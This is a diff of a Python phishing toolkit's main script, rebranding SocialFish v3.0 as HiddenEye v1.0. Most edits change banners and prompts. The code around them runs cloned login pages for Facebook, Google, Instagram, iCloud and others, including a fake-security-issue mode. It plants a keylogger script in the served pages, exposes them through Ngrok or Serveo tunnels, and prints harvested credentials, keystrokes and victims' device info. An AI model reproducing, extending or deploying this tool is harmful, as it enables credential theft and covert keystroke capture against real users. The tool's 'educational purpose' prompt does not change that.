@@ -1,7 +1,7 @@
 #!/usr/bin/python3
 #-*- coding: utf-8 -*-
-#   SOCIALFISH v3.0
-#     by: An0nUD4Y
+#    HiddenEye v1.0
+#    By:- DARKSEC TEAM
 #
 ###########################
 from time import sleep
@@ -26,12 +26,7 @@ def connected(host='http://duckduckgo.com'): #Checking network connection.
     except:
         return False
 if connected() == False: #If there no network
-     print ('''
-  ....._____.......     ____ ____ ____ _ ____ _       ____ _ ____ _  _
-      /     \/|         [__  |  | |    | |__| |       |___ | [__  |__|
-      \o__  /\|         ___] |__| |___ | |  | |___    |    | ___] |  |
-          \|
-                    {0}[{1}!{0}]{1} Network error. Verify your connection.\n
+     print ('''{0}[{1}!{0}]{1} Network error. Verify your Internet connection.\n
 '''.format(RED, DEFAULT))
      exit(0)
 
@@ -54,30 +49,13 @@ def checkNgrok(): #Check if user already have Ngrok server, if False - downloadi
         system('clear')
 checkNgrok()
 
-def end(): #Message when SocialFish exit
+def end(): #Message when HiddenEye exit
     system('clear')
-    print ('''
-                   S O C I A L{2}
-              |\    \ \ \ \ \ \ \      __           ___
-              |  \    \ \ \ \ \ \ \   | O~-_    _-~~   ~~-_
-              |   >----|-|-|-|-|-|-|--|  __/   /   {1}DON'T{2}   )
-              |  /    / / / / / / /   |__\   <     {1}FORGET{2}   )
-              |/     / / / / / / /             \_   {1}ME !{2}  _)
-                          {1}F I S H{2}                ~--___--~
-               {0}NOW WITH LIVE VICTIM ATTACK INFORMATION ]
-          {0}A KEYLOGGER IS DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
-   [ {0} Some more phising pages have been added in script. For a better Attack]
-[ {0} WELCOME TO SOCIALFISH V3.0  by-An0nUD4Y]\n {1}'''.format(GREEN, DEFAULT, CYAN))
+    print ('''{1} THANK YOU FOR USING HIDDENEYE! JOIN DARKSEC TEAM NOW (github.com/DarkSecDevelopers). 
+    WAITING FOR YOUR CONTRIBUTION. GOOD BYE ! {1}'''.format(RED, DEFAULT, CYAN))
 
 def loadModule(module):
-       print ('''{0}
-   _.-=-._     .-,
- .'       "-.,' /
-( AnonUD4Y  _.  <
- `=.____.="  `._\\
-
-
- [{1}*{0}]{1} %s module loaded. Building site...{0}'''.format(CYAN, DEFAULT) % module)
+       print ('''{0}[{1}*{0}]{1} %s Modules Are Loading. You Have to Wait a few seconds...{0}'''.format(CYAN, DEFAULT) % module)
 
 def runPhishing(page, option2): #Phishing pages selection menu
     system('rm -Rf Server/www/*.* && touch Server/www/usernames.txt && touch Server/www/ip.txt && cp WebPages/ip.php Server/www/ && cp WebPages/KeyloggerData.txt Server/www/ && cp WebPages/keylogger.js Server/www/ && cp WebPages/keylogger.php Server/www/')
@@ -143,18 +121,9 @@ def log(ctx): #Writing log
 
 
 def waitCreds():
-    print("{0}[{1}*{0}]{1} Hi Hacker Everything has been completed.............. Start HAcking ".format(RED, DEFAULT))
-
-    print('''{0}
-   _.-=-._     .-,
- .'       "-.,' /
-(  AnonUD4Y_  ~.<
- `=.____.="  `._\\
-
- [{1}*{0}]{1} WE HAVE ALSO DEPLOYED A KEYLOGGER. .
- [{1}*{0}]{1} YOU WILL GET VICTIM'S DEVICES INFO.{0}'''.format(CYAN, DEFAULT))
-
-    print(" {0}[{1}*{0}]{1} Waiting for credentials//Pressed keys//Victim's device info... \n".format(RED, DEFAULT))
+    print("{0}[{1}*{0}]{1} Looks Like Everything is Ready. Now Feel The Power.".format(CYAN, DEFAULT))
+    print("{0}[{1}*{0}]{1} KEEP EYE ON HIDDEN WORLD WITH DARKSEC.".format(RED, DEFAULT))
+    print(" {0}[{1}*{0}]{1} Waiting for credentials//Keystrokes//Victim's device info. \n".format(CYAN, DEFAULT))
     while True:
         with open('Server/www/usernames.txt') as creds:
             lines = creds.read().rstrip()
@@ -163,7 +132,7 @@ def waitCreds():
                 log(' {0}[ CREDENTIALS FOUND ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                 system('rm -rf Server/www/usernames.txt && touch Server/www/usernames.txt')
                 log('======================================================================'.format(RED, DEFAULT))
-                log(' {0}***** HOPE YOU ARE ENJOYING. SO PLEASE MAKE IT MORE POPULAR *****{1}\n {0}{1}'.format(RED, DEFAULT))
+                log(' {0}***** I KNOW YOU ARE ENJOYING. SO MAKE IT POPULAR TO GET MORE FEATURES *****{1}\n {0}{1}'.format(RED, DEFAULT))
 
         creds.close()
 
@@ -195,7 +164,7 @@ def waitCreds():
             lines = creds.read().rstrip()
             if len(lines) != 0:
                 log('______________________________________________________________________'.format(RED, DEFAULT))
-                log(' {0}[ GETTING PRESSED KEYS ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
+                log(' {0}[KEY PRESSED ]{1}:\n {0}%s{1}'.format(GREEN, DEFAULT) % lines)
                 system('rm -rf Server/www/KeyloggerData.txt && touch Server/www/KeyloggerData.txt')
                 log('______________________________________________________________________'.format(RED, DEFAULT))
 
@@ -205,48 +174,37 @@ def waitCreds():
 
 def runPEnv(): #menu where user select what they wanna use
     system('clear')
-    print ('''           {2}-{1} An0nUD4Y {2}|{1} An0nUD4Y {2}|{1} An0nUD4Y {2}- INDIA
-                       .   .  .
-                 .  '  .        '                        '
-             '             '      '                   '   '
-  ███████ ████████ ███████ ██ ███████ ██       ███████ ██ ███████ ██   ██
-  ██      ██    ██ ██      ██ ██   ██ ██       ██      ██ ██      ██   ██
-  ███████ ██    ██ ██      ██ ███████ ██       █████   ██ ███████ ███████
-       ██ ██    ██ ██      ██ ██   ██ ██       ██      ██      ██ ██   ██
-  ███████ ████████ ███████ ██ ██   ██ ███████  ██      ██ ███████ ██   ██
-      .    '   '....'               ..'.      ' .
-         '  .                     .     '          '     '  {1}v3.0{2}
-               '  .  .  .  .  . '.    .'              '  .
-                   '         '    '. '  {1}Updated_By--> AnonUD4Y_{2}
+    print ('''------>{2} HIDDEN EYE {2}<-------
  _________________________________________________________________________________
-          {0}[ NOW WITH LIVE VICTIM ATTACK INFORMATION ]
-          {0}A KEYLOGGER WILL BE DEPLOYED FOR YOU, TO CAPTURE EVERY KEYSTROKE ]
+          {0}[ LIVE VICTIM  ATTACK INFORMATION ]
+          {0}[ LIVE KEYSTROKES CAN BE CAPTURED ]
  _________________________________________________________________________________
                              {1}'''.format(GREEN, DEFAULT, CYAN))
 
     for i in range(101):
         sleep(0.01)
-        stdout.write("\r{0}[{1}*{0}]{1} Preparing environment... %d%%".format(CYAN, DEFAULT) % i)
+        stdout.write("\r{0}[{1}*{0}]{1} Eye is Opening. Please Wait... %d%%".format(CYAN, DEFAULT) % i)
         stdout.flush()
 
     print ("\n\n{0}[{1}*{0}]{1} Searching for PHP installation... ".format(CYAN, DEFAULT))
     if 256 != system('which php'): #Checking if user have PHP
         print (" --{0}>{1} OK.".format(CYAN, DEFAULT))
     else:
-        print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run me again.http://www.php.net/".format(RED, DEFAULT))
+        print (" --{0}>{1} PHP NOT FOUND: \n {0}*{1} Please install PHP and run HiddenEye again.http://www.php.net/".format(RED, DEFAULT))
         exit(0)
-    if input(" {0}[{1}!{0}]{1} Do you agree to use this tool for educational purposes only? (y/n)\n {2}SF-An0nUD4Y > {1}".format(RED, DEFAULT, CYAN)).upper() != 'Y': #Question where user must accept education purposes
+    if input(" {0}[{1}!{0}]{1} DO YOU AGREE TO USE THIS TOOL FOR EDUCATIONAL PURPOSE ?  (y/n)\n {2}[HIDDENEYE-DARKSEC]- > {1}".format(RED, DEFAULT, CYAN)).upper() != 'Y': #Question where user must accept education purposes
         system('clear')
-        print ('\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU NEED A GOOD MIND AND SOUL TO BE ONE OF US. GET AWAY FROM HERE AND DO NOT COME BACK WITH SAME MOTIVE. GOOD BYE!{1} ]\n'.format(RED, DEFAULT))
-        exit(0)
-    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With   An0nUD4Y !\n\n {0}SF-An0nUD4Y >  {1}".format(CYAN, DEFAULT))
+        print ('\n[ {0}YOU ARE NOT AUTHORIZED TO USE THIS TOOL.YOU CAN ONLY USE IT FOR EDUCATIONAL PURPOSE. GOOD BYE!{1} ]\n'.format(RED, DEFAULT))
+        exit(0)    
+   
+    option = input("\nSelect an option:\n\n {0}[{1}1{0}]{1} Facebook\n\n {0}[{1}2{0}]{1} Google\n\n {0}[{1}3{0}]{1} LinkedIn\n\n {0}[{1}4{0}]{1} GitHub\n\n {0}[{1}5{0}]{1} StackOverflow\n\n {0}[{1}6{0}]{1} WordPress\n\n {0}[{1}7{0}]{1} Twitter\n\n {0}[{1}8{0}]{1} Instagram\n\n {0}[{1}9{0}]{1} Snapchat\n\n {0}[{1}10{0}]{1} Yahoo\n\n {0}[{1}11{0}]{1} Twitch\n\n {0}[{1}12{0}]{1} Microsoft\n\n {0}[{1}13{0}]{1} Steam\n\n {0}[{1}14{0}]{1} VK\n\n {0}[{1}15{0}]{1} iCloud\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED With   An0nUD4Y !\n\n {0}[HIDDENEYE-DARKSEC]- >  {1}".format(CYAN, DEFAULT))
     if option == '1':
         loadModule('Facebook')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing-Poll Ranking Method(Poll_mode/login_with)\n\n {0}[{1}3{0}]{1} Facebook Phishing- Fake Security issue(security_mode) \n\n {0}[{1}4{0}]{1} Facebook Phising-Messenger Credentials(messenger_mode) \n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
         runPhishing('Facebook', option2)
     elif option == '2':
         loadModule('Google')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}3{0}]{1} New Google Web\n\n {0}[{1}----->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED !\n\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
         runPhishing('Google', option2)
     elif option == '3':
         loadModule('LinkedIn')
@@ -270,7 +228,7 @@ def runPEnv(): #menu where user select what they wanna use
         runPhishing('Twitter', option2)
     elif option == '8':
         loadModule('Instagram')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard Instagram Web Page Phishing\n\n {0}[{1}2{0}]{1} Instagram Autoliker Phising (After submit redirects to original autoliker)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
         runPhishing('Instagram', option2)
     elif option == '9':
         loadModule('Snapchat')
@@ -294,7 +252,7 @@ def runPEnv(): #menu where user select what they wanna use
         runPhishing('Steam', option2)
     elif option == '14':
         loadModule('VK')
-        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+        option2 = input("\nOperation mode:\n\n {0}[{1}1{0}]{1} Standard VK Web Page Phishing\n\n {0}[{1}2{0}]{1} Advanced Phishing(poll_mode/login_with)\n\n {0}[{1}------------->{0}]{1} More Phising Scripts COMMING SOON ! STAY TUNED ! \n\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
         runPhishing('VK', option2)
     elif option == '15':
         loadModule('iCloud')
@@ -339,7 +297,7 @@ if __name__ == "__main__":
         runPEnv()
         def custom(): #Question where user can input custom web-link
             print("\n {0}Insert a custom redirect url:".format(CYAN, DEFAULT))
-            custom = input("\n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+            custom = input("\n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
             if 'http://' or 'https://' in custom:
                 pass
             else:
@@ -368,7 +326,7 @@ if __name__ == "__main__":
         def server(): #Question where user must select server
                 print("\n {0}Please select any available server:{1}".format(CYAN, DEFAULT))
                 print("\n {0}[{1}1{0}]{1} Ngrok\n {0}[{1}2{0}]{1} Serveo".format(CYAN, DEFAULT))
-                choice = input(" \n {0}SF-An0nUD4Y > {1}".format(CYAN, DEFAULT))
+                choice = input(" \n {0}[HIDDENEYE-DARKSEC]- > {1}".format(CYAN, DEFAULT))
                 if choice == '1':
                     runNgrok()
                 elif choice == '2':
